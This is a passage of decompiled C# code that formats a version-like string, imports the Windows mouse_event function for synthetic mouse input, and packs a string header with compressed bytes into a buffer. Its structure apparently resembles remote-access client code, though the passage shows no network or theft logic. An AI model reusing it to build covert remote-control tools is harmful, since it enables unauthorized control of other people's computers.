				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		return text + "." + Conversions.ToString(num) + text2;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	public static byte[] SB(ref string s, ref byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] bytes = Encoding.Default.GetBytes(s);
		memoryStream.Write(bytes, 0, bytes.Length);
		byte[] b = B;
		bool CM = true;
		byte[] array = API.ZIP(b, ref CM);
		memoryStream.Write(array, 0, array.Length);
		return memoryStream.ToArray();
	}
}
